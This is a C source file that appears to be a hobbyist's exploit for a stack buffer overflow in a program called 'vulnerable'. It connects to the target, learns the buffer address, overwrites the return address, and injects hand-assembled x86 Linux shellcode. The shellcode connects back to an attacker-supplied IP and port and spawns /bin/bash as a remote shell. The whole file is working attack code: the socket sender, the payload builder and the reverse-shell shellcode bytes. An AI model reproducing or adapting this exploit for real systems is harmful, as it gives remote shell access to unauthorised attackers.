#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <errno.h>

#define MAX_S 1000
#define BUFFER_SIZE 300   //is the size of the buffer to overflow in vulnerable
#define RET (BUFFER_SIZE+4)


char *do_string(int IP,int PORT,int ADDR);
extern const unsigned char code[];
void usage(char* prog_name);

/* 
   I'll alloc a string BUFFER_SIZE+5 bytes long,
   if BUFFER_SIZE>strlen(code), else can be done a jmp 
   and do the same,consider if the address of buffer has
   a zero too
   this is my exploit!!!ahah
   arguments:
    IP is given in human format, so for example
       0x1a2b3c3d means the IP 1a.2b.3c.3d
       (you know well that network format is opposite)
    PORT too is given in human format
    ADDR is the address of the buffer to overflow
*/
char *do_string(int IP,int PORT,int ADDR)
{
  unsigned char *c,*d;
  int len;
  if(BUFFER_SIZE<=strlen(code))return NULL; //no space for the code (I can add 
  //the feature for doing the exploit in another way (using a jmp into the code))
  len=BUFFER_SIZE+9;
  c=(unsigned char*)malloc(len);  
  printf("allocated %d bytes\n",len);
  //pad with a !=0 
  for(d=c;d<c+len;d++)
    d[0]=0x1;
  d=c;
  //verify that there aren't zeroes inside the exploit string
  if((ADDR&0xff)==0) //the address must be increased by one
  {
    printf("worning address is 0x%x\n",ADDR);
    d[0]=0x90;  //NOP at the first byte of buf
    ADDR++;
    d++;
  }
  if((IP&0xff)==0 || (IP&0xff00)==0 || (IP&0xff0000)==0 || (IP&0xff000000)==0)
  {
    fprintf(stderr,"the IP of your prompttelnet has a zero inside it,\n"
    		"this is unacceptable becouse the exploit string must be\n"
    		"not terminated by 0s. You are unlucky, sorry\n");
    exit(-1);
  }
  if((PORT&0xff)==0 || (PORT&0xff00)==0)
  {
    fprintf(stderr,"the PORT of your prompttelnet has a zero inside it,\n"
    		"this is unacceptable becouse the exploit string must be\n"
    		"not terminated by 0s.\n"
    		"You can restart your prompttelnet program on another PORT!\n");
    exit(-1);
  }
  strncpy(d,code,strlen(code)); //I don't want '\0' here eheh
  
  d[78]=(unsigned char) (IP>>24);
  d[79]=(unsigned char) (IP>>16);
  d[80]=(unsigned char) (IP>>8);
  d[81]=(unsigned char) (IP);
  //note: *((int*)&c[78])=IP; no, becouse IP is stored as bigendian, not little endian
  if(PORT!=0) //port=0 will leave the default
  { 
    d[73]=(unsigned char) (PORT>>8);
    d[74]=(unsigned char) (PORT);
  }
  printf("assuming your prompttelnet program is at:\n");
  printf("IP: %u.%u.%u.%u\n",d[78],d[79],d[80],d[81]);
  printf("PORT: %u\n",ntohs(*(short*)&d[73]));
  *((int*)&c[RET])=ADDR;	//the RET address (RET is BUFFER_SIZE+4)
  c[RET+4]=0;			//NULL terminated string
  return c;
}




void usage(char* prog_name)
{
  fprintf(stderr,"usage:\t%s <vuln_IP> <vuln_PORT> <prom_IP> <prom_PORT>\n"
  		"where:\n"
  		"\t<vuln_IP>\tis the IP of the host running vulnerable\n" 
  		"\t<vuln_PORT>\tis the PORT opened by vulnerable\n" 
  		"\t<prom_IP>\tis the IP of the host where you run\n"
  		"\t\t\tthe prompttelnet program (can be your current IP)\n" 
  		"\t<prom_PORT>\tis the PORT where prompttelnet will listen\n" 
  		"\t\t\tfor a connection from vulnerable\n",
  		prog_name);
  exit(-1);
}



/*
 * main function:
 * this will ask first the address of the buffer to 
 * overflow of the vulnerable program,
 * then it will send the exploit to it, giving you 
 * a shell on that host
 */
int main(int argn,char **argv)
{
  int sock;
  char tosend[MAX_S];
  int a_buf;
  struct sockaddr_in addr_server;
  int ret;
  int i;
  unsigned int IP,PORT,ADDR;
  unsigned char *expl;

  if(argn!=5)usage(*argv);
  
  IP=ntohl(inet_addr(argv[3]));		//this is my IP seen by other host
  PORT=atoi(argv[4]);    	//(the port of my server telnet)for default 0

  sock=socket(AF_INET,SOCK_STREAM,0);
  addr_server.sin_family=AF_INET;
  addr_server.sin_addr.s_addr=inet_addr(argv[1]);	//vulnerable host IP
  addr_server.sin_port=htons(atoi(argv[2]));		//vulnerable host PORT
  if(connect(sock,(struct sockaddr*)&addr_server,sizeof(addr_server)))
  {
    printf("error: connect\n");exit(-1);
  }
  printf("connected to %u.%u.%u.%u:%u\n",
             (addr_server.sin_addr.s_addr) & 0xff,
             ((addr_server.sin_addr.s_addr)>>8)&0xff,
             ((addr_server.sin_addr.s_addr)>>16)&0xff,
             ((addr_server.sin_addr.s_addr)>>24)&0xff,
             ntohs(addr_server.sin_port));

  tosend[MAX_S-1]=0; //ahah, be careful 
  
  strncpy(tosend,"A",MAX_S-1);  //ask code

  ret=send(sock,tosend,strlen(tosend),0); //ask address of buffer to overflow
  if(ret==-1)
  {
    perror("send()");
    exit(-1);
  }
  ret=recv(sock,(char*)&ADDR,sizeof(int),0);
  printf("receved address of buffer vulnerable = 0x%x\n",(ret>0)?ADDR:0);

  expl=do_string(IP,PORT,ADDR);  //the code begin from the second byte in the buffer
  if(expl==NULL)
  {
    fprintf(stderr,"error: the buffer to exploit is "
    		"littler of the exploit to put into\n");
    exit(-1);
  }
    
  tosend[0]='X';             //exploit code
  strncpy(tosend+1,expl,strlen(expl)+1);
  
  ret=send(sock,tosend,strlen(tosend),0); //this send without the 0 
  if(ret==-1)perror("");
  printf("sent exploit string of %d bytes\n",ret);

  printf("WORK DONE\nbye from Gildo\n");  

  free(expl);
  close(sock);
  return 0;
}



/* 
 * This is my exploit code that I have written in asm first
 * and then dumped here with a perl script
 * NOTE:
 * PORT actual is 0x5246 to change!!**********************************
 * 0x66,0xc7,0x45,0xea,0x46,0x52, \*804809f:movw $0x5246,0xffffffea(%ebp)*\ 
 * IP actual is 127.3.3.1 to change!!!******************************
 * 0xc7,0x45,0xec,0x7f,0x03,0x03,0x01,\*80480a5:movl $0x100007f,0xffffffec(%ebp) *\
 */
const unsigned char code[] =
{
  0x31,0xc0,                   /*  8048074: xor    %eax,%eax     */
  0x66,0xb8,0xff,0xff,         /*  8048076: mov    $0xffff,%ax   */
  0x29,0xc4,                   /*  8048078: sub    %eax,%esp     */
  0x31,0xc0,                   /*  8048074: xor    %eax,%eax     */
  0x89,0xe5,                   /*  804807a: mov    %esp,%ebp     */
  0xb0,0x34,                   /*  804807c: mov    $0x34,%al     */
  0x29,0xc4,                   /*  804807e: sub    %eax,%esp     */

/* 0000000008048080 <fork>: */
  0x31,0xdb,                   /*  8048080: xor    %ebx,%ebx     */
  0xb0,0x02,                   /*  8048082: mov    $0x2,%al      */
  0xcd,0x80,                   /*  8048084: int    $0x80         */
  0x39,0xc3,                   /*  8048086: cmp    %eax,%ebx     */
  0x74,0x05,                   /*  8048088: je     804808f <end_fork> */
  0x89,0xd8,                   /*  804808a: mov    %ebx,%eax     */
  0x40,                        /*  804808c: inc    %eax          */
  0xcd,0x80,                   /*  804808d: int    $0x80         */

/* 000000000804808f <end_fork>: */
  0x31,0xc0,                   /*  804808f: xor    %eax,%eax     */
  0x50,                        /*  8048091: push   %eax          */
  0x6a,0x01,                   /*  8048092: push   $0x1          */
  0x6a,0x02,                   /*  8048094: push   $0x2          */
  0x29,0xdb,//35                   /*  8048096: sub    %ebx,%ebx     */
  0x43,                        /*  8048098: inc    %ebx          */
  0x89,0xe1,                   /*  8048099: mov    %esp,%ecx     */
  0x31,0xc0,                   /*  804809b: xor    %eax,%eax     */
  0xb0,0x66,                   /*  804809d: mov    $0x66,%al     */
  0xcd,0x80,                   /*  804809f: int    $0x80         */
  0x89,0x45,0xfc,              /*  80480a1: mov    %eax,0xfffffffc(%ebp) */
  0x31,0xc0,                   /*  80480a4: xor    %eax,%eax     */
  0xb0,0x66,                   /*  80480a6: mov    $0x66,%al     */
  0xcd,0x80,                   /*  80480a8: int    $0x80         */
  0x89,0x45,0xf8,              /*  80480aa: mov    %eax,0xfffffff8(%ebp) */
  0x31,0xc0,                   /*  80480ad: xor    %eax,%eax     */
  0xb0,0x02,                   /*  80480af: mov    $0x2,%al      */
  0x66,0x89,0x45,0xe8,         /*  80480b1: mov    %ax,0xffffffe8(%ebp) */
  //PORT (bytes 69-70) actual is 0x5246 to change!!*******************
  0x66,0xc7,0x45,0xea,0x46,0x52, /*804809f:movw $0x5246,0xffffffea(%ebp)*/
  //IP (bytes 74-77) actual is 127.3.3.1 to change!!!******************************
  0xc7,0x45,0xec,0x7f,0x03,0x03,0x01,/*80480a5:movl $0x100007f,0xffffffec(%ebp) */
  0x8b,0x45,0xf8,              /*  80480c2: mov    0xfffffff8(%ebp),%eax */
  0x89,0x45,0xdc,              /*  80480c5: mov    %eax,0xffffffdc(%ebp) */
  0x8d,0x45,0xe8,              /*  80480c8: lea    0xffffffe8(%ebp),%eax */
  0x89,0x45,0xe0,              /*  80480cb: mov    %eax,0xffffffe0(%ebp) */
  0x31,0xc0,                   /*  80480ce: xor    %eax,%eax     */
  0xb0,0x10,                   /*  80480d0: mov    $0x10,%al     */
  0x89,0x45,0xe4,              /*  80480d2: mov    %eax,0xffffffe4(%ebp) */
  0x31,0xc0,                   /*  80480d5: xor    %eax,%eax     */
  0x89,0xc3,                   /*  80480d7: mov    %eax,%ebx     */
  0x8d,0x4d,0xdc,              /*  80480d9: lea    0xffffffdc(%ebp),%ecx */
  0xb3,0x03,                   /*  80480dc: mov    $0x3,%bl      */
  0xb0,0x66,                   /*  80480de: mov    $0x66,%al     */
  0xcd,0x80,                   /*  80480e0: int    $0x80         */
  0x8b,0x45,0xfc,              /*  80480e2: mov    0xfffffffc(%ebp),%eax */
  0x89,0x45,0xdc,              /*  80480e5: mov    %eax,0xffffffdc(%ebp) */
  0x31,0xc0,                   /*  80480e8: xor    %eax,%eax     */
  0x89,0xc3,                   /*  80480ea: mov    %eax,%ebx     */
  0x8d,0x4d,0xdc,              /*  80480ec: lea    0xffffffdc(%ebp),%ecx */
  0xb3,0x03,                   /*  80480ef: mov    $0x3,%bl      */
  0xb0,0x66,                   /*  80480f1: mov    $0x66,%al     */
  0xcd,0x80,                   /*  80480f3: int    $0x80         */
  0x31,0xc0,                   /*  80480f5: xor    %eax,%eax     */
  0x31,0xdb,                   /*  80480f7: xor    %ebx,%ebx     */
  0xb0,0x06,                   /*  80480f9: mov    $0x6,%al      */
  0xcd,0x80,                   /*  80480fb: int    $0x80         */
  0x31,0xc0,                   /*  80480fd: xor    %eax,%eax     */
  0x8b,0x5d,0xfc,              /*  80480ff: mov    0xfffffffc(%ebp),%ebx */
  0x89,0xc1,                   /*  8048102: mov    %eax,%ecx     */
  0x89,0xc2,                   /*  8048104: mov    %eax,%edx     */
  0xb0,0x37,                   /*  8048106: mov    $0x37,%al     */
  0xcd,0x80,                   /*  8048108: int    $0x80         */
  0x31,0xc0,                   /*  804810a: xor    %eax,%eax     */
  0x31,0xdb,                   /*  804810c: xor    %ebx,%ebx     */
  0x43,                        /*  804810e: inc    %ebx          */
  0xb0,0x06,                   /*  804810f: mov    $0x6,%al      */
  0xcd,0x80,                   /*  8048111: int    $0x80         */
  0x31,0xc0,                   /*  8048113: xor    %eax,%eax     */
  0x8b,0x5d,0xf8,              /*  8048115: mov    0xfffffff8(%ebp),%ebx */
  0x89,0xc1,                   /*  8048118: mov    %eax,%ecx     */
  0x89,0xc2,                   /*  804811a: mov    %eax,%edx     */
  0xb0,0x37,                   /*  804811c: mov    $0x37,%al     */
  0xcd,0x80,                   /*  804811e: int    $0x80         */
  0x31,0xc0,                   /*  8048120: xor    %eax,%eax     */
  0x31,0xdb,                   /*  8048122: xor    %ebx,%ebx     */
  0x43,                        /*  8048124: inc    %ebx          */
  0x43,                        /*  8048125: inc    %ebx          */
  0xb0,0x06,                   /*  8048126: mov    $0x6,%al      */
  0xcd,0x80,                   /*  8048128: int    $0x80         */
  0x31,0xc0,                   /*  804812a: xor    %eax,%eax     */
  0x8b,0x5d,0xf8,              /*  804812c: mov    0xfffffff8(%ebp),%ebx */
  0x89,0xc1,                   /*  804812f: mov    %eax,%ecx     */
  0x89,0xc2,                   /*  8048131: mov    %eax,%edx     */
  0xb0,0x37,                   /*  8048133: mov    $0x37,%al     */
  0xcd,0x80,                   /*  8048135: int    $0x80         */

/* 0000000008048137 <execve>: */
  0x31,0xc0,                   /*  8048137: xor    %eax,%eax     */
  0xb0,0x68,                   /*  8048139: mov    $0x68,%al     */
  0x50,                        /*  804813b: push   %eax          */
  0x68,0x2f,0x62,0x61,0x73,    /*  804813c: push   $0x7361622f   */
  0x68,0x2f,0x62,0x69,0x6e,    /*  8048141: push   $0x6e69622f   */
  0x89,0xe3,                   /*  8048146: mov    %esp,%ebx     */
  0x31,0xc0,                   /*  8048148: xor    %eax,%eax     */
  0x50,                        /*  804814a: push   %eax          */
  0x53,                        /*  804814b: push   %ebx          */
  0x89,0xe1,                   /*  804814c: mov    %esp,%ecx     */
  0x8d,0x54,0x24,0x04,         /*  804814e: lea    0x4(%esp,1),%edx */
  0xb0,0x0b,                   /*  8048152: mov    $0xb,%al      */
  0xcd,0x80,                   /*  8048154: int    $0x80         */

/* 0000000008048156 <quit>: */
  0x31,0xdb,                   /*  8048156: xor    %ebx,%ebx     */
  0x89,0xd8,                   /*  8048158: mov    %ebx,%eax     */
  0x40,                        /*  804815a: inc    %eax          */
  0xcd,0x80,                   /*  804815b: int    $0x80         */
  0x8d,0x76,0x00               /*  804815d: lea    0x0(%esi),%esi */
};


